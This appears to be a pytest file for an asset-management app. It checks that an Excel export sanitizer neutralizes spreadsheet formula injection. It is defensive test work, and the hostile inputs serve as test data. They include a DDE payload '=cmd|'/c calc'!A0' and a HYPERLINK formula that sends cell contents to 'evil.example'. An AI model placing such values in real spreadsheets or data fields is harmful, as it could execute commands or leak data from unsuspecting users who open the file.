"""AM-09: openpyxl auto-detects a string cell value starting with "=" and
marks it as a formula (confirmed directly: Workbook().active.append(["=cmd|
calc!A1"]) sets cell.data_type == "f"). Every free-text field in an export
(Description, Brand, Vendor name, a Custom Field value, a correction's
Reason, remarks, ...) is user-controlled and can originate from an
externally-supplied Import spreadsheet, so an unescaped leading "=", "+",
"-", or "@" would become a live, executing formula for whoever next opens
the exported report in Excel. These tests confirm the fix: such a value is
prefixed with a literal-text-forcing apostrophe and never reaches Excel as
an executable formula, in all three export types."""
from io import BytesIO

import openpyxl
from app.core.db import SessionLocal
from app.core.security import hash_password
from app.holders.models import Holder
from app.masters.models import AssetCategory, AssetSubcategory, Company, CostCenter, Department, Location
from app.numbering.models import CodeRule
from app.reports.export_service import _sanitize_cell


async def _setup(suffix: str):
    async with SessionLocal() as session:
        co = Company(code=f"FI-{suffix}", name=f"Formula Injection Co {suffix}")
        cat = AssetCategory(code=f"FI-{suffix}", name="FI Category")
        session.add_all([co, cat])
        await session.flush()
        sub = AssetSubcategory(category_id=cat.id, code="SUB", name="FI Sub")
        cc = CostCenter(company_id=co.id, code="HO01", name="HO")
        loc = Location(code=f"FI-HO-{suffix}", name="HO")
        dept = Department(name=f"FI-IT-{suffix}")
        session.add_all([sub, cc, loc, dept])
        await session.flush()
        stock = Holder(company_id=co.id, emp_code=f"FISTK-{suffix}", name="FI Stock", holder_type="IT_STOCK",
                        location_id=loc.id, department_id=dept.id, role="HOLDER")
        admin = Holder(company_id=co.id, emp_code=f"FIADM-{suffix}", name="FI Admin", holder_type="EMPLOYEE",
                        location_id=loc.id, department_id=dept.id, role="ADMIN",
                        password_hash=hash_password("Passw0rd!"), must_change_password=False)
        rule = CodeRule(company_id=co.id, prefix_template=f"FI-{suffix}/", suffix_template="",
                         start_number=1, pad_width=0)
        session.add_all([stock, admin, rule])
        await session.commit()
        return {"co": co, "cat": cat, "sub": sub, "cc": cc, "loc": loc, "dept": dept, "stock": stock, "admin": admin}


async def _headers(client, ids):
    resp = await client.post("/api/auth/login", json={
        "company_id": ids["co"].id, "login_id": ids["admin"].emp_code, "password": "Passw0rd!",
    })
    return {"Authorization": f"Bearer {resp.json()['access_token']}"}


def test_sanitize_cell_prefixes_every_formula_trigger_character():
    """Direct unit coverage of the exact openpyxl behavior this fix guards
    against -- confirms the sanitizer catches all four characters Excel's own
    formula bar treats as formula-starting, and leaves ordinary text alone."""
    for dangerous in ("=cmd|'/c calc'!A0", "+1+1", "-2-2", "@SUM(1,1)"):
        sanitized = _sanitize_cell(dangerous)
        assert sanitized == "'" + dangerous
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.append([sanitized])
        assert ws["A1"].data_type == "s", f"{dangerous!r} still became a formula after sanitizing"
        assert ws["A1"].value == sanitized

    assert _sanitize_cell("normal description") == "normal description"
    assert _sanitize_cell(None) is None
    assert _sanitize_cell(42) == 42


async def test_asset_register_export_neutralizes_a_formula_injection_attempt(client):
    ids = await _setup("A1")
    headers = await _headers(client, ids)
    create_resp = await client.post("/api/assets", json={
        "company_id": ids["co"].id, "cost_center_id": ids["cc"].id, "category_id": ids["cat"].id,
        "subcategory_id": ids["sub"].id, "description": "=cmd|'/c calc'!A0",
        "purchase_date": "2025-01-01", "initial_holder_id": ids["stock"].id,
        "brand": "+1+1", "model": "-2-2", "legacy_asset_code": "@SUM(A1:A9)",
    }, headers=headers)
    assert create_resp.status_code == 201

    export_resp = await client.get("/api/reports/export/assets", headers=headers)
    assert export_resp.status_code == 200
    wb = openpyxl.load_workbook(BytesIO(export_resp.content))
    ws = wb.active
    columns = [c.value for c in ws[1]]
    row = [c for c in ws[2]]
    description_cell = row[columns.index("Description")]
    brand_cell = row[columns.index("Brand")]
    model_cell = row[columns.index("Model")]
    legacy_cell = row[columns.index("Legacy Asset Code")]

    assert description_cell.data_type == "s", "asset Description became a live formula in the export"
    assert description_cell.value == "'=cmd|'/c calc'!A0"
    assert brand_cell.data_type == "s"
    assert model_cell.data_type == "s"
    assert legacy_cell.data_type == "s"


async def test_movement_log_export_neutralizes_a_formula_injection_attempt(client):
    ids = await _setup("A2")
    headers = await _headers(client, ids)
    create_resp = await client.post("/api/assets", json={
        "company_id": ids["co"].id, "cost_center_id": ids["cc"].id, "category_id": ids["cat"].id,
        "subcategory_id": ids["sub"].id, "description": "Movement Log FI Asset",
        "purchase_date": "2025-01-01", "initial_holder_id": ids["stock"].id,
    }, headers=headers)
    asset_id = create_resp.json()[0]["id"]

    move_resp = await client.post(f"/api/assets/{asset_id}/events", json={
        "event_type": "MOVED", "event_date": "2025-06-01", "to_holder_id": ids["stock"].id,
        "remarks": "=HYPERLINK(\"http://evil.example/\"&A1,\"click\")",
    }, headers=headers)
    assert move_resp.status_code == 201

    export_resp = await client.get(
        "/api/reports/export/movements?from_date=2025-01-01&to_date=2025-12-31", headers=headers,
    )
    assert export_resp.status_code == 200
    wb = openpyxl.load_workbook(BytesIO(export_resp.content))
    ws = wb.active
    columns = [c.value for c in ws[1]]
    remarks_col = columns.index("Remarks")
    remarks_cells = [row[remarks_col] for row in ws.iter_rows(min_row=2)]
    injected = [c for c in remarks_cells if c.value and "evil.example" in str(c.value)]
    assert injected, "expected the injected remarks row to be present in the export"
    for cell in injected:
        assert cell.data_type == "s", "movement remarks became a live formula in the export"
